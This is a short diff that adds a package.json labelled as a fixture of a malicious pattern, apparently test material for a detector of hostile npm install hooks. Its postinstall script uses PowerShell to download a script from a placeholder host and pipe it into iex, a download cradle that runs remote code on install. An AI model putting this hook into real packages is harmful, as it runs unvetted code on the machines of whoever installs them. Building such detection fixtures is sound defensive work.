@@ -1,0 +1,8 @@
+{
+  "name": "lwfx-iwr-iex",
+  "version": "1.0.0",
+  "description": "FIXTURE (malicious pattern): PowerShell download cradle",
+  "scripts": {
+    "postinstall": "powershell -c \"iwr http://example.invalid/a.ps1 -UseBasicParsing | iex\""
+  }
+}
